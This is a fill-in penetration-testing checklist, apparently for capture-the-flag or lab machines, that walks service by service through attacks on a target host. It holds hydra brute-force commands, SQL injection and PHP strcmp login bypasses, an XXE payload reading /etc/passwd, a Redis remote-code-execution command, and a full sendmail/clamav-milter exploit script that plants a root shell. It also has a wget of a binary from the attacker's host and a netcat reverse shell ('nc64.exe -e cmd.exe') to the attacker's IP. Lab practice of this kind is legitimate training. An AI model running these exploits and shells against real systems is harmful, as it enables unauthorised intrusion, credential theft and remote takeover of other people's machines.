# {VM_NAME}

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | {REMOTE_IP}  |
| Local IP          | {LOCAL_IP}   |
| Local listen port | {LOCAL_PORT} |

## Nmap

- [ ] Full TCP port scan

```bash
ports=$(nmap -p- --min-rate=1000 -T4 {REMOTE_IP} | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```bash
nmap -p$ports -sV -A {REMOTE_IP}
```

- [ ] Well-known UDP port scan

```bash
sudo nmap -Pn -sU --min-rate=10000 {REMOTE_IP}
```

## TCP
### FTP - 21

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] Anonymous login

  - [ ] `anonymous:`

  ```bash
  ftp anonymous@{REMOTE_IP} 21
  ```

  - [ ] `anonymous:anonymous`

  ```bash
  ftp anonymous@{REMOTE_IP} 21
  ```

- [ ] Brute-force attack

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://{REMOTE_IP} -V -f -t 60
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://{REMOTE_IP} -V -f -t 60
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ftp joe@{REMOTE_IP} 21
  ```

### SSH - 22

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] Brute-force attack

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://{REMOTE_IP}:22 -V -f -t 60
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://{REMOTE_IP}:22 -V -f -t 60
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ssh joe@{REMOTE_IP} -p 22
  ```

  If `no matching host key type found` error occurs with this command, try the following.

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-dss username@{REMOTE_IP}
  ```

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-rsa username@{REMOTE_IP}
  ```

### SMTP - 25

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] Enumerate user

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {REMOTE_IP}
```

### HTTP - 80

- [ ] Check software version

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |
|               |         |               |
|               |         |               |

#### Enumeration

- [ ] Directory buster
  - [ ] /


```bash
gobuster dir -f -u http://{REMOTE_IP}:80/ -w /usr/share/wordlists/dirb/common.txt
```

If the web server we are attacking is configured to always respond with a 200 response code, try the following.

```bash
gobuster dir -f -u http://{REMOTE_IP}:80/ -w /usr/share/wordlists/dirb/common.txt -b "200"
```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [ ] Read page source

#### Login brute force

- [ ] Default credentials
  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password

- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)
  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty

- [ ] Basic Authentication

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 80 -f {REMOTE_IP} http-get /
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 80 -f {REMOTE_IP} http-get /
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

#### SQL

- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

#### PHP

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

#### XML

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

### SMB - 445

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] Administrator login

  - [ ] `Administrator:`

  ```bash
  smbclient -L {REMOTE_IP} -p 445 -U Administrator
  ```

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  smbclient -L 192.168.188.125 -p 445 -U joe
  ```

### MySQL - 3306

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

### RDP - 3389

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] Guest login

  - [ ] `:`

  ```bash
  xfreerdp /v:{REMOTE_IP}
  ```

- [ ] Administrator login

  - [ ] `Administrator:`

  ```bash
  xfreerdp /v:{REMOTE_IP} /cert:ignore /u:Administrator
  ```

### PostgreSQL - 5432

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] login default credentials

  - [ ] `postgres:`

  ```bash
  psql -h 192.168.243.56 -p 5432 -U postgres
  ```

  - [ ] `postgres:postgres`

  ```bash
  psql -h 192.168.243.56 -p 5432 -U postgres
  ```

### Redis - 6379

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] [Redis Rogue Server <= 5.0.5 - RCE](https://github.com/n0b0dyCN/redis-rogue-server)

```bash
python3 redis-rogue-server.py --rhost {REMOTE_IP} --rport 6379 --lhost {LOCAL_IP} --lport {LOCAL_PORT}
```

## UDP
### TFTP - 69

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] Upload any file

```bash
tftp {REMOTE_IP}
```

```tftp
tftp> put {any_filename}
tftp> quit
```

The default save location for uploaded files is `/var/lib/tftpboot/`.

### SNMP - 161

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

- [ ] Enumerate SNMP managed devices

```bash
snmp-check {REMOTE_IP}
```

- [ ] [Sendmail with clamav-milter < 0.91.2 - RCE](https://www.exploit-db.com/exploits/4761)

```python
#!/usr/bin/python3
import os
import sys
import socket

if len(sys.argv[1:]) != 1:
    print("Usage: ./clamav_milter_shell.py [targethost]")
    print("Example: ./clamav_milter_shell.py 10.12.132.1")
    sys.exit(0)

target_host = sys.argv[1]
target_port = 25
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_port))
client.send(b"ehlo you\r\n"
            b"mail from: <>\r\n"
            b"rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n"
            b"rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n"
            b"data\r\n.\r\nquit\r\n")
os.system(f"nc -nv {REMOTE_IP} 31337")
client.close()
```

## Linux Privilege Escalation

- [ ] List SUDO binaries

```bash
sudo -l
```

- [ ] Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

- [ ] Find files owned by any group

```bash
find / -group any_group -type f 2>/dev/null
```

- [ ] Check `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```

- [ ] Check network connections

```bash
netstat -tlpn
```

If the owner of the process is `root`, search prvesc.

- [ ] Enumerate scheduled jobs

  - [ ] cron job

  ```bash
  find / -name */cron -type d
  ls -la /var/spool/cron/crontabs/
  ```

  - [ ] [pspy](https://github.com/DominicBreuker/pspy)

  ```bash local
  python3 -m http.server 8000
  ```

  ```bash remote
  wget http://{LOCAL_IP}:8000/pspy64
  chmod +x pspy64
  ./pspy64
  ```

- [ ] Check [PayloadsAllTheThings Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

## Windows Privilege Escalation

- [ ] [nc64.exe](https://eternallybored.org/misc/netcat/)

Remote machine

```bash
nc64.exe -e cmd.exe {LOCAL_IP} {LOCAL_PORT}
```

## When you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

